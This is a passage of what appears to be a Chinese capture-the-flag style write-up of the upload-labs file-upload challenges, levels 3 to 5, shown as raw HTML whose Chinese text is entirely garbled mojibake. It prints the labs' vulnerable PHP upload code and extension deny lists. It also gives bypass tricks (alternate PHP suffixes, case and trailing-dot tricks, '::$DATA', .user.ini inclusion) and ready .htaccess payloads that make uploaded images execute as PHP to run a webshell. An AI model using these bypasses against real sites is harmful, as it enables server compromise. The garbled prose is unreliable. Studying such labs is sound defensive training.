class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³äºMIME-Typeçš„å°çŸ¥è¯†ï¼š</strong></p><p>MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚</p><p><strong>å…³äº$_FILESçš„å°çŸ¥è¯†ï¼š</strong></p><p><img src="https://i.loli.net/2021/02/13/eUsimQBMdZ3rX7v.png" alt="$_FILESæ•°ç»„å†…å®¹"></p><h2 id="pass3ï¼ˆé»‘åå•-åç¼€åï¼‰"><a href="#pass3ï¼ˆé»‘åå•-åç¼€åï¼‰" class="headerlink" title="pass3ï¼ˆé»‘åå•-åç¼€åï¼‰"></a>pass3ï¼ˆé»‘åå•-åç¼€åï¼‰</h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸Šä¼ ä¸€ä¸ªğŸï¼Œtips:ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼</p><p>ä¹Ÿå°±æ˜¯è¯´é»‘åå•ä¸­éƒ½ä¸èƒ½ä¸Šä¼ loï¼Œ<strong>åªé’ˆå¯¹é»‘åå•ä¸­æ²¡æœ‰çš„åç¼€åï¼Œæ–‡ä»¶æ‰èƒ½ä¸Šä¼ æˆåŠŸ</strong></p><p><img src="https://i.loli.net/2021/02/13/otYfysrCXbOJKzV.png"></p><h3 id="bypass-2"><a href="#bypass-2" class="headerlink" title="bypass"></a>bypass</h3><p>1ã€é»‘åå•ä¸å…¨</p><p>è¯¸å¦‚php1ã€php5ã€phtmlè¿™äº›éƒ½å¯ä»¥ä¸Šä¼ ï¼Œä½¿ç”¨è¿™ç±»çš„åç¼€åå°±è¡Œäº†ï¼ˆå‰ææ˜¯èƒ½å¤Ÿè§£æï¼Œä¸ç„¶ä¸Šä¼ ä¹Ÿæ²¡æ„ä¹‰ï¼‰</p><p>è¿™é‡Œæ–‡ä»¶ä¸Šä¼ ååå­—ä¼šè¢«æ›´æ”¹ã€‚</p><p>æ³¨æ„ä¸­é—´ä»¶å¯¹ä¸åŒæ–‡ä»¶ç±»å‹çš„è§£æé—®é¢˜ï¼ˆä¸€èˆ¬æ˜¯é…ç½®é—®é¢˜ï¼‰ï¼Œä¸ç„¶å°±ä¼šå‡ºç°ä¸Šä¼ æˆåŠŸå´æ— æ³•åˆ©ç”¨çš„æƒ…å†µ</p><p><img src="https://i.loli.net/2021/02/13/qHMEu6g7Qiv9KZO.png"></p><p>æ­¤å¤„å› ä¸ºç¯å¢ƒæ˜¯ç”¨phpstudyæ­å»ºçš„ï¼Œå°±æ— æ³•è§£æphp5ï¼Œä¿®æ”¹ä¸€ä¸‹httpd.conf~</p><p>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š<code>AddType application/x-httpd-php .php .phtml .php1 .php2 .php3 .php4 .php5</code>å†é‡å¯ä¸€ä¸‹å³å¯</p><p>ä¸è¿‡æˆ‘å†è®¿é—®å´æ˜¯è®©æˆ‘ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ã€‚ã€‚æ˜¾ç„¶è§£æå‡ºé—®é¢˜äº†QAQ</p><p>2ã€æ­¤å¤„æ²¡æœ‰è¿‡æ»¤.htaccessï¼Œå¯ä»¥ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼ˆå†…å®¹ä¸º<code>SetHandler application/x-httpd-php</code>ï¼‰ï¼Œä»è€Œå°†æ‰€æœ‰æ–‡ä»¶è§£æä¸ºphpã€‚ï¼ˆå…·ä½“çœ‹ç¬¬å››å…³~ï¼‰</p><p>æºç ï¼š</p><p>ä¸€èˆ¬é»‘åå•éªŒè¯å¯ä»¥å°è¯•</p><p>â€˜.â€™å·ï¼ˆå¦‚ï¼š<code>a.php.</code>ï¼‰ã€å¤§å°å†™ï¼ˆå¦‚PhPï¼‰ã€ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ï¼š1.php::$DATAï¼‰ã€Apacheåç¼€è§£æï¼ˆ.php.xxxä¸º.phpï¼‰ç­‰ç­‰</p><blockquote><p>windowsåœ¨åˆ›å»ºæ–‡ä»¶æ—¶ä¼šåˆ é™¤åç¼€ååçš„.å’Œç©ºæ ¼ï¼Œå¹¶ä¸”åç¼€åä¸ºphp.çš„æ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥å½“ä½œphpè§£æçš„ï¼ˆwindowså’Œlinuxç¯å¢ƒéƒ½å¯ä»¥ï¼‰</p></blockquote><p>ä½†è¿™äº›åœ¨æºç ä¸­éƒ½banäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-comment">#trim();å»æ‰å­—ç¬¦ä¸²ä¸¤ç«¯å¤šä½™ç©ºæ ¼</span><br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment"># deldot();åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼›â€˜.â€™å·ï¼ˆå¦‚ï¼š`a.php.`ï¼‰</span><br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment"># strrchr();ä»åˆ é™¤&quot;.&quot;çš„ä½ç½®å¼€å§‹åˆ é™¤ â€œxxx.php.xxxâ€åˆ é™¤.xxxï¼›</span><br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment"># strtolower();ï¼›å¤§å°å†™ï¼ˆå¦‚PhPï¼‰</span><br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//æ”¶å°¾å»ç©º</span><br><br>        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="pass4ï¼ˆé»‘åå•-htaccessï¼‰"><a href="#pass4ï¼ˆé»‘åå•-htaccessï¼‰" class="headerlink" title="pass4ï¼ˆé»‘åå•-.htaccessï¼‰"></a>pass4ï¼ˆé»‘åå•-.htaccessï¼‰</h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>banï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†æ›´å¤šç±»å‹ï¼Œä½†æ²¡æœ‰ç¦ç”¨<code>.htaccess</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å…ˆä¸Šä¼ <code>.htaccess</code>ï¼Œåœ¨ä¸Šä¼ æœ¨é©¬~</p><h4 id="å…³äº-htaccessï¼š"><a href="#å…³äº-htaccessï¼š" class="headerlink" title="å…³äº.htaccessï¼š"></a>å…³äº<code>.htaccess</code>ï¼š</h4><p><strong>æ¡ä»¶ï¼š</strong></p><p>php5.6ä»¥ä¸‹ä¸å¸¦ntsçš„ç‰ˆæœ¬</p><p>æœåŠ¡å™¨æ²¡æœ‰ç¦æ­¢.htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼Œä¸”æœåŠ¡å•†å…è®¸ç”¨æˆ·ä½¿ç”¨è‡ªå®šä¹‰.htaccessæ–‡ä»¶</p><p><strong>åˆ©ç”¨æ–¹å¼ï¼š</strong></p><p>ä¸Šä¼ è¦†ç›–.htaccessæ–‡ä»¶ï¼Œé‡å†™è§£æè§„åˆ™ï¼Œå°†ä¸Šä¼ çš„å¸¦æœ‰è„šæœ¬é©¬çš„å›¾ç‰‡ä»¥è„šæœ¬æ–¹å¼è§£æã€‚</p><p><strong>å…³äº.htaccessæ–‡ä»¶å†…å®¹ï¼š</strong></p><p>.htaccessæ–‡ä»¶è§£æè§„åˆ™çš„å¢åŠ ï¼Œæ˜¯å¯ä»¥æŒ‰ç…§ç»„åˆçš„æ–¹å¼å»åšçš„ï¼Œå…·ä½“éœ€è¦è‡ªå·±å¤šæµ‹è¯•ä¸€ä¸‹ã€‚</p><p>ç¬¬ä¸€ç§ã€è™½ç„¶å¥½ç”¨ï¼Œä½†æ˜¯ä¼šè¯¯ä¼¤å…¶ä»–æ­£å¸¸æ–‡ä»¶ï¼ŒåŠ¨é™å¤§å®¹æ˜“è¢«å‘ç°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;IfModule mime_module&gt;</span><br><br><span class="hljs-attribute">AddHandler</span> php<span class="hljs-number">5</span>-script .gif     #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œåªé’ˆå¯¹gifæ–‡ä»¶ä¼šè§£ææˆphpä»£ç æ‰§è¡Œ<br><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php  #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«è§£ææˆphpä»£ç æ‰§è¡Œ<br><br><span class="hljs-section">&lt;/IfModule&gt;</span><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç§ã€åŒ1æ²¡å¤ªå¤§åŒºåˆ«</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;IfModule mime_module&gt;</span><br><br><span class="hljs-attribute">AddType</span> application/x-httpd-php .gif<br><br><span class="hljs-section">&lt;/IfModule&gt;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰ç§ã€ç²¾ç¡®æ§åˆ¶èƒ½è¢«è§£ææˆphpä»£ç çš„æ–‡ä»¶ï¼Œæ¯”è¾ƒéšè”½<br>evil.gifå³ä¸ºä¸Šä¼ çš„ğŸåç§°+åç¼€</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;evil.gif&quot;</span>&gt;</span> <span class="hljs-comment">#å½“å‰ç›®å½•ä¸‹ï¼Œè‹¥åŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ</span><br><br><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-attribute">AddHandler</span> php<span class="hljs-number">5</span>-script .gif    <br><br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;info&quot;</span>&gt;</span><span class="hljs-comment">#å½“å‰ç›®å½•ä¸‹ï¼Œè‹¥åŒ¹é…åˆ°åä¸ºinfoçš„æ–‡ä»¶ï¼Œéƒ½ä¼šè¢«è§£æä¸ºphpä»£ç </span><br>    <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><h3 id="bypass-3"><a href="#bypass-3" class="headerlink" title="bypass"></a>bypass</h3><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;info&quot;</span>&gt;</span><br>    <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ åä¸ºinfoï¼Œä»»æ„åç¼€åçš„ä¸€å¥è¯ğŸå³å¯</p><h2 id="pass5ï¼ˆé»‘åå•-åˆ©ç”¨-user-iniæœ¬åœ°åŒ…å«ï¼‰"><a href="#pass5ï¼ˆé»‘åå•-åˆ©ç”¨-user-iniæœ¬åœ°åŒ…å«ï¼‰" class="headerlink" title="pass5ï¼ˆé»‘åå•-åˆ©ç”¨.user.iniæœ¬åœ°åŒ…å«ï¼‰"></a>pass5ï¼ˆé»‘åå•-åˆ©ç”¨.user.iniæœ¬åœ°åŒ…å«ï¼‰</h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åœ¨ç¬¬å››å…³åŸºç¡€ä¸Š.htaccessä¹Ÿè¢«ç¦ç”¨äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å¯ä»¥åˆ©ç”¨<code>.user.ini</code>æ–‡ä»¶</p><h4 id="user-ini-å’Œ-php-iniï¼š"><a href="#user-ini-å’Œ-php-iniï¼š" class="headerlink" title=".user.ini å’Œ php.iniï¼š"></a>.user.ini å’Œ php.iniï¼š</h4><h5 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h5><p><strong>php.ini</strong>æ˜¯phpçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œåœ¨ PHP å¯åŠ¨æ—¶è¢«è¯»å–ã€‚</p><p>â€‹    <strong>ä½†webç›®å½•çš„å…¶ä»–iniæ–‡ä»¶ä¹Ÿå¯ä»¥è¢«phpè¯†åˆ«</strong></p><h5 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h5><p><strong>.user.ini</strong>å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.ini</p><p>è€Œåªæœ‰<code>PHP_INI_USERæ¨¡å¼</code>ã€<code>PHP_INI_PERDIRæ¨¡å¼ï¼ˆä¸‹è¡¨æ²¡æœ‰æåˆ°ï¼‰</code>å¯ä»¥åœ¨ <strong>.user.ini</strong> ä¸­è®¾å®š</p><p><img src="https://i.loli.net/2021/02/13/3av5Zf6eGdDcwu9.png"><img src="https://i.loli.net/2021/02/13/RCYt9k2ZgGIfQzM.png"></p><p>åœ¨æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>.user.ini</code>æœ¬åœ°åŒ…å«æ–‡ä»¶ï¼Œä»è€Œå®ç°å¯¹ğŸçš„è§£æ</p><h3 id="åˆ©ç”¨-user-iniæœ¬åœ°åŒ…å«æ–‡ä»¶"><a href="#åˆ©ç”¨-user-iniæœ¬åœ°åŒ…å«æ–‡ä»¶" class="headerlink" 